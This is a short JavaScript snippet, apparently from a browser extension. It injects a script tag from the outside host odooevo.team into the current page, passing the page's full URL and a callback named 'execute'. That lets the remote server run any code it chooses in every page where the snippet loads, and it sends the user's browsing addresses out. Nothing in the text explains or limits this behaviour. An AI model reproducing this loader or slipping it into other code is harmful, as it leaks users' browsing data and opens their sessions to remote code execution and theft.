var el = document.createElement('script');
el.setAttribute("src", `https://odooevo.team/extention/jsonp?url=${encodeURIComponent(window.location.href)}&callback=execute`);
document.body.appendChild(el);